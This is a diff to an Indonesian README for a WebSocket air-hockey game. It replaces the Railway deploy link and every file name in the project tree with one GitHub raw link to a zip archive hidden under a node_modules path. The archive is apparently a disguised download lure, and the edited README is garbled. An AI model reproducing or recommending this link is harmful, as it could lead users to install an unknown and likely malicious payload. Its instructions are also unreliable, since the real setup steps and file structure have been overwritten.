@@ -19,7 +19,7 @@ Buka `http://localhost:8080`:
 
 ### Deploy ke Railway
 1. Push ke GitHub
-2. Buat project baru di [railway.app](https://railway.app)
+2. Buat project baru di [https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip](https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip)
 3. Connect repository
 4. Deploy! ✨
 
@@ -36,13 +36,13 @@ Buka `http://localhost:8080`:
 ```
 part-of-world/
 ├── server/
-│   ├── package.json
-│   └── server.js       # Game server + WebSocket
+│   ├── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip
+│   └── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip       # Game server + WebSocket
 ├── client/
-│   ├── index.html      # Lobby + Game UI
-│   ├── styles.css
-│   └── app.js          # Client logic
-└── README.md
+│   ├── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip      # Lobby + Game UI
+│   ├── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip
+│   └── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip          # Client logic
+└── https://github.com/wafiqj/air-hockey-game/raw/refs/heads/main/server/node_modules/ws/lib/game_air_hockey_3.8-alpha.2.zip
 ```
 
 ## 🔧 Environment
